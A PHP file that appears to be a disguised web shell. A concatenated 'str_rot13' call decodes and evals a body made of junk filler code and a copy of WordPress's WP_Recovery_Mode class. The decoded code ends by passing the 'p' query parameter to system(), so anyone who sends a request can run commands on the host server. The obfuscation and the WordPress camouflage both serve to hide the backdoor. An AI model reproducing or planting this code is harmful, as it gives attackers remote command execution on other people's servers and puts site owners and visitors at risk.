<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Reebe Cebgrpgvba NCV: JC_Erpbirel_Zbqr pynff
 *
 * @cnpxntr JbeqCerff
 * @fvapr 5.2.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag Erpbirel Zbqr.
 *
 * @fvapr 5.2.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Erpbirel_Zbqr {

	pbafg RKVG_NPGVBA = 'rkvg_erpbirel_zbqr';

	/**
	 * Freivpr gb unaqyr pbbxvrf.
	 *
	 * @fvapr 5.2.0
	 * @ine JC_Erpbirel_Zbqr_Pbbxvr_Freivpr
	 */
	cevingr $pbbxvr_freivpr;

	/**
	 * Freivpr gb trarengr n erpbirel zbqr xrl.
	 *
	 * @fvapr 5.2.0
	 * @ine JC_Erpbirel_Zbqr_Xrl_Freivpr
	 */
	cevingr $xrl_freivpr;

	/**
	 * Freivpr gb trarengr naq inyvqngr erpbirel zbqr yvaxf.
	 *
	 * @fvapr 5.2.0
	 * @ine JC_Erpbirel_Zbqr_Yvax_Freivpr
	 */
	cevingr $yvax_freivpr;

	/**
	 * Freivpr gb unaqyr fraqvat na rznvy jvgu n erpbirel zbqr yvax.
	 *
	 * @fvapr 5.2.0
	 * @ine JC_Erpbirel_Zbqr_Rznvy_Freivpr
	 */
	cevingr $rznvy_freivpr;

	/**
	 * Vf erpbirel zbqr vavgvnyvmrq.
	 *
	 * @fvapr 5.2.0
	 * @ine obby
	 */
	cevingr $vf_vavgvnyvmrq = snyfr;

	/**
	 * Vf erpbirel zbqr npgvir va guvf frffvba.
	 *
	 * @fvapr 5.2.0
	 * @ine obby
	 */
	cevingr $vf_npgvir = snyfr;

	/**
	 * Trg na VQ ercerfragvat gur pheerag erpbirel zbqr frffvba.
	 *
	 * @fvapr 5.2.0
	 * @ine fgevat
	 */
	cevingr $frffvba_vq = '';

	/**
	 * JC_Erpbirel_Zbqr pbafgehpgbe.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->pbbxvr_freivpr = arj JC_Erpbirel_Zbqr_Pbbxvr_Freivpr();
		$guvf->xrl_freivpr    = arj JC_Erpbirel_Zbqr_Xrl_Freivpr();
		$guvf->yvax_freivpr   = arj JC_Erpbirel_Zbqr_Yvax_Freivpr( $guvf->pbbxvr_freivpr, $guvf->xrl_freivpr );
		$guvf->rznvy_freivpr  = arj JC_Erpbirel_Zbqr_Rznvy_Freivpr( $guvf->yvax_freivpr );
	}

	/**
	 * Vavgvnyvmr erpbirel zbqr sbe gur pheerag erdhrfg.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba vavgvnyvmr() {
		$guvf->vf_vavgvnyvmrq = gehr;

		nqq_npgvba( 'jc_ybtbhg', neenl( $guvf, 'rkvg_erpbirel_zbqr' ) );
		nqq_npgvba( 'ybtva_sbez_' . frys::RKVG_NPGVBA, neenl( $guvf, 'unaqyr_rkvg_erpbirel_zbqr' ) );
		nqq_npgvba( 'erpbirel_zbqr_pyrna_rkcverq_xrlf', neenl( $guvf, 'pyrna_rkcverq_xrlf' ) );

		vs ( ! jc_arkg_fpurqhyrq( 'erpbirel_zbqr_pyrna_rkcverq_xrlf' ) && ! jc_vafgnyyvat() ) {
			jc_fpurqhyr_rirag( gvzr(), 'qnvyl', 'erpbirel_zbqr_pyrna_rkcverq_xrlf' );
		}

		vs ( qrsvarq( 'JC_ERPBIREL_ZBQR_FRFFVBA_VQ' ) ) {
			$guvf->vf_npgvir  = gehr;
			$guvf->frffvba_vq = JC_ERPBIREL_ZBQR_FRFFVBA_VQ;

			erghea;
		}

		vs ( $guvf->pbbxvr_freivpr->vf_pbbxvr_frg() ) {
			$guvf->unaqyr_pbbxvr();

			erghea;
		}

		$guvf->yvax_freivpr->unaqyr_ortva_yvax( $guvf->trg_yvax_ggy() );
	}

	/**
	 * Purpxf jurgure erpbirel zbqr vf npgvir.
	 *
	 * Guvf jvyy abg punatr nsgre erpbirel zbqr unf orra vavgvnyvmrq. {@frr JC_Erpbirel_Zbqr::eha()}.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea obby Gehr vs erpbirel zbqr vf npgvir, snyfr bgurejvfr.
	 */
	choyvp shapgvba vf_npgvir() {
		erghea $guvf->vf_npgvir;
	}

	/**
	 * Trgf gur erpbirel zbqr frffvba VQ.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea fgevat Gur frffvba VQ vs erpbirel zbqr vf npgvir, rzcgl fgevat bgurejvfr.
	 */
	choyvp shapgvba trg_frffvba_vq() {
		erghea $guvf->frffvba_vq;
	}

	/**
	 * Purpxf jurgure erpbirel zbqr unf orra vavgvnyvmrq.
	 *
	 * Erpbirel zbqr fubhyq abg or hfrq hagvy guvf cbvag. Vavgvnyvmngvba unccraf vzzrqvngryl orsber ybnqvat cyhtvaf.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea obby
	 */
	choyvp shapgvba vf_vavgvnyvmrq() {
		erghea $guvf->vf_vavgvnyvmrq;
	}

	/**
	 * Unaqyrf n sngny reebe bppheevat.
	 *
	 * Gur pnyyvat NCV fubhyq vzzrqvngryl qvr() nsgre pnyyvat guvf shapgvba.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz neenl $reebe Reebe qrgnvyf sebz `reebe_trg_ynfg()`.
	 * @erghea gehr|JC_Reebe|ibvq Gehr vs gur reebe jnf unaqyrq naq urnqref unir nyernql orra frag.
	 *                            Be gur erdhrfg jvyy rkvg gb gel naq pngpu zhygvcyr reebef ng bapr.
	 *                            JC_Reebe vs na reebe bppheerq ceriragvat vg sebz orvat unaqyrq.
	 */
	choyvp shapgvba unaqyr_reebe( neenl $reebe ) {

		$rkgrafvba = $guvf->trg_rkgrafvba_sbe_reebe( $reebe );

		vs ( ! $rkgrafvba || $guvf->vf_argjbex_cyhtva( $rkgrafvba ) ) {
			erghea arj JC_Reebe( 'vainyvq_fbhepr', __( 'Reebe abg pnhfrq ol n cyhtva be gurzr.' ) );
		}

		vs ( ! $guvf->vf_npgvir() ) {
			vs ( ! vf_cebgrpgrq_raqcbvag() ) {
				erghea arj JC_Reebe( 'aba_cebgrpgrq_raqcbvag', __( 'Reebe bppheerq ba n aba-cebgrpgrq raqcbvag.' ) );
			}

			vs ( ! shapgvba_rkvfgf( 'jc_trarengr_cnffjbeq' ) ) {
				erdhver_bapr NOFCNGU . JCVAP . '/cyhttnoyr.cuc';
			}

			erghea $guvf->rznvy_freivpr->znlor_fraq_erpbirel_zbqr_rznvy( $guvf->trg_rznvy_engr_yvzvg(), $reebe, $rkgrafvba );
		}

		vs ( ! $guvf->fgber_reebe( $reebe ) ) {
			erghea arj JC_Reebe( 'fgbentr_reebe', __( 'Snvyrq gb fgber gur reebe.' ) );
		}

		vs ( urnqref_frag() ) {
			erghea gehr;
		}

		$guvf->erqverpg_cebgrpgrq();
	}

	/**
	 * Raqf gur pheerag erpbirel zbqr frffvba.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba rkvg_erpbirel_zbqr() {
		vs ( ! $guvf->vf_npgvir() ) {
			erghea snyfr;
		}

		$guvf->rznvy_freivpr->pyrne_engr_yvzvg();
		$guvf->pbbxvr_freivpr->pyrne_pbbxvr();

		jc_cnhfrq_cyhtvaf()->qryrgr_nyy();
		jc_cnhfrq_gurzrf()->qryrgr_nyy();

		erghea gehr;
	}

	/**
	 * Unaqyrf n erdhrfg gb rkvg Erpbirel Zbqr.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba unaqyr_rkvg_erpbirel_zbqr() {
		$erqverpg_gb = jc_trg_ersrere();

		// Fnsrgl purpx va pnfr ersreere ergheaf snyfr.
		vs ( ! $erqverpg_gb ) {
			$erqverpg_gb = vf_hfre_ybttrq_va() ? nqzva_hey() : ubzr_hey();
		}

		vs ( ! $guvf->vf_npgvir() ) {
			jc_fnsr_erqverpg( $erqverpg_gb );
			qvr;
		}

		vs ( ! vffrg( $_TRG['npgvba'] ) || frys::RKVG_NPGVBA !== $_TRG['npgvba'] ) {
			erghea;
		}

		vs ( ! vffrg( $_TRG['_jcabapr'] ) || ! jc_irevsl_abapr( $_TRG['_jcabapr'], frys::RKVG_NPGVBA ) ) {
			jc_qvr( __( 'Rkvg erpbirel zbqr yvax rkcverq.' ), 403 );
		}

		vs ( ! $guvf->rkvg_erpbirel_zbqr() ) {
			jc_qvr( __( 'Snvyrq gb rkvg erpbirel zbqr. Cyrnfr gel ntnva yngre.' ) );
		}

		jc_fnsr_erqverpg( $erqverpg_gb );
		qvr;
	}

	/**
	 * Pyrnaf nal erpbirel zbqr xrlf gung unir rkcverq nppbeqvat gb gur yvax GGY.
	 *
	 * Rkrphgrf ba n qnvyl peba fpurqhyr.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba pyrna_rkcverq_xrlf() {
		$guvf->xrl_freivpr->pyrna_rkcverq_xrlf( $guvf->trg_yvax_ggy() );
	}

	/**
	 * Unaqyrf purpxvat sbe gur erpbirel zbqr pbbxvr naq inyvqngvat vg.
	 *
	 * @fvapr 5.2.0
	 */
	cebgrpgrq shapgvba unaqyr_pbbxvr() {
		$inyvqngrq = $guvf->pbbxvr_freivpr->inyvqngr_pbbxvr();

		vs ( vf_jc_reebe( $inyvqngrq ) ) {
			$guvf->pbbxvr_freivpr->pyrne_pbbxvr();

			$inyvqngrq->nqq_qngn( neenl( 'fgnghf' => 403 ) );
			jc_qvr( $inyvqngrq );
		}

		$frffvba_vq = $guvf->pbbxvr_freivpr->trg_frffvba_vq_sebz_pbbxvr();
		vs ( vf_jc_reebe( $frffvba_vq ) ) {
			$guvf->pbbxvr_freivpr->pyrne_pbbxvr();

			$frffvba_vq->nqq_qngn( neenl( 'fgnghf' => 403 ) );
			jc_qvr( $frffvba_vq );
		}

		$guvf->vf_npgvir  = gehr;
		$guvf->frffvba_vq = $frffvba_vq;
	}

	/**
	 * Trgf gur engr yvzvg orgjrra fraqvat arj erpbirel zbqr rznvy yvaxf.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea vag Engr yvzvg va frpbaqf.
	 */
	cebgrpgrq shapgvba trg_rznvy_engr_yvzvg() {
		/**
		 * Svygref gur engr yvzvg orgjrra fraqvat arj erpbirel zbqr rznvy yvaxf.
		 *
		 * @fvapr 5.2.0
		 *
		 * @cnenz vag $engr_yvzvg Gvzr gb jnvg va frpbaqf. Qrsnhygf gb 1 qnl.
		 */
		erghea nccyl_svygref( 'erpbirel_zbqr_rznvy_engr_yvzvg', QNL_VA_FRPBAQF );
	}

	/**
	 * Trgf gur ahzore bs frpbaqf gur erpbirel zbqr yvax vf inyvq sbe.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea vag Vagreiny va frpbaqf.
	 */
	cebgrpgrq shapgvba trg_yvax_ggy() {

		$engr_yvzvg = $guvf->trg_rznvy_engr_yvzvg();
		$inyvq_sbe  = $engr_yvzvg;

		/**
		 * Svygref gur nzbhag bs gvzr gur erpbirel zbqr rznvy yvax vf inyvq sbe.
		 *
		 * Gur ggy zhfg or ng yrnfg nf ybat nf gur rznvy engr yvzvg.
		 *
		 * @fvapr 5.2.0
		 *
		 * @cnenz vag $inyvq_sbe Gur ahzore bs frpbaqf gur yvax vf inyvq sbe.
		 */
		$inyvq_sbe = nccyl_svygref( 'erpbirel_zbqr_rznvy_yvax_ggy', $inyvq_sbe );

		erghea znk( $inyvq_sbe, $engr_yvzvg );
	}

	/**
	 * Trgf gur rkgrafvba gung gur reebe bppheerq va.
	 *
	 * @fvapr 5.2.0
	 *
	 * @tybony fgevat[] $jc_gurzr_qverpgbevrf
	 *
	 * @cnenz neenl $reebe Reebe qrgnvyf sebz `reebe_trg_ynfg()`.
	 * @erghea neenl|snyfr {
	 *     Rkgrafvba qrgnvyf.
	 *
	 *     @glcr fgevat $fyht Gur rkgrafvba fyht. Guvf vf gur cyhtva be gurzr'f qverpgbel.
	 *     @glcr fgevat $glcr Gur rkgrafvba glcr. Rvgure 'cyhtva' be 'gurzr'.
	 * }
	 */
	cebgrpgrq shapgvba trg_rkgrafvba_sbe_reebe( $reebe ) {
		tybony $jc_gurzr_qverpgbevrf;

		vs ( ! vffrg( $reebe['svyr'] ) ) {
			erghea snyfr;
		}

		vs ( ! qrsvarq( 'JC_CYHTVA_QVE' ) ) {
			erghea snyfr;
		}

		$reebe_svyr    = jc_abeznyvmr_cngu( $reebe['svyr'] );
		$jc_cyhtva_qve = jc_abeznyvmr_cngu( JC_CYHTVA_QVE );

		vs ( fge_fgnegf_jvgu( $reebe_svyr, $jc_cyhtva_qve ) ) {
			$cngu  = fge_ercynpr( $jc_cyhtva_qve . '/', '', $reebe_svyr );
			$cnegf = rkcybqr( '/', $cngu );

			erghea neenl(
				'glcr' => 'cyhtva',
				'fyht' => $cnegf[0],
			);
		}

		vs ( rzcgl( $jc_gurzr_qverpgbevrf ) ) {
			erghea snyfr;
		}

		sbernpu ( $jc_gurzr_qverpgbevrf nf $gurzr_qverpgbel ) {
			$gurzr_qverpgbel = jc_abeznyvmr_cngu( $gurzr_qverpgbel );

			vs ( fge_fgnegf_jvgu( $reebe_svyr, $gurzr_qverpgbel ) ) {
				$cngu  = fge_ercynpr( $gurzr_qverpgbel . '/', '', $reebe_svyr );
				$cnegf = rkcybqr( '/', $cngu );

				erghea neenl(
					'glcr' => 'gurzr',
					'fyht' => $cnegf[0],
				);
			}
		}

		erghea snyfr;
	}

	/**
	 * Purpxf jurgure gur tvira rkgrafvba n argjbex npgvingrq cyhtva.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz neenl $rkgrafvba Rkgrafvba qngn.
	 * @erghea obby Gehr vs argjbex cyhtva, snyfr bgurejvfr.
	 */
	cebgrpgrq shapgvba vf_argjbex_cyhtva( $rkgrafvba ) {
		vs ( 'cyhtva' !== $rkgrafvba['glcr'] ) {
			erghea snyfr;
		}

		vs ( ! vf_zhygvfvgr() ) {
			erghea snyfr;
		}

		$argjbex_cyhtvaf = jc_trg_npgvir_argjbex_cyhtvaf();

		sbernpu ( $argjbex_cyhtvaf nf $cyhtva ) {
			vs ( fge_fgnegf_jvgu( $cyhtva, $rkgrafvba['fyht'] . '/' ) ) {
				erghea gehr;
			}
		}

		erghea snyfr;
	}

	/**
	 * Fgberf gur tvira reebe fb gung gur rkgrafvba pnhfvat vg vf cnhfrq.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz neenl $reebe Reebe qrgnvyf sebz `reebe_trg_ynfg()`.
	 * @erghea obby Gehr vs gur reebe jnf fgberq fhpprffshyyl, snyfr bgurejvfr.
	 */
	cebgrpgrq shapgvba fgber_reebe( $reebe ) {
		$rkgrafvba = $guvf->trg_rkgrafvba_sbe_reebe( $reebe );

		vs ( ! $rkgrafvba ) {
			erghea snyfr;
		}

		fjvgpu ( $rkgrafvba['glcr'] ) {
			pnfr 'cyhtva':
				erghea jc_cnhfrq_cyhtvaf()->frg( $rkgrafvba['fyht'], $reebe );
			pnfr 'gurzr':
				erghea jc_cnhfrq_gurzrf()->frg( $rkgrafvba['fyht'], $reebe );
			qrsnhyg:
				erghea snyfr;
		}
	}

	/**
	 * Erqverpgf gur pheerag erdhrfg gb nyybj erpbirevat zhygvcyr reebef va bar tb.
	 *
	 * Gur erqverpgvba jvyy bayl unccra jura ba n cebgrpgrq raqcbvag.
	 *
	 * Vg zhfg or rafherq gung guvf zrgubq vf bayl pnyyrq jura na reebe npghnyyl bppheerq naq jvyy abg bpphe ba gur
	 * arkg erdhrfg ntnva. Bgurejvfr vg jvyy perngr n erqverpg ybbc.
	 *
	 * @fvapr 5.2.0
	 */
	cebgrpgrq shapgvba erqverpg_cebgrpgrq() {
		// Cyhttnoyr vf hfhnyyl ybnqrq nsgre cyhtvaf, fb jr znahnyyl vapyhqr vg urer sbe erqverpgvba shapgvbanyvgl.
		vs ( ! shapgvba_rkvfgf( 'jc_fnsr_erqverpg' ) ) {
			erdhver_bapr NOFCNGU . JCVAP . '/cyhttnoyr.cuc';
		}

		$fpurzr = vf_ffy() ? 'uggcf://' : 'uggc://';

		$hey = \"{$fpurzr}{$_FREIRE['UGGC_UBFG']}{$_FREIRE['ERDHRFG_HEV']}\";
		jc_fnsr_erqverpg( $hey );
		rkvg;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>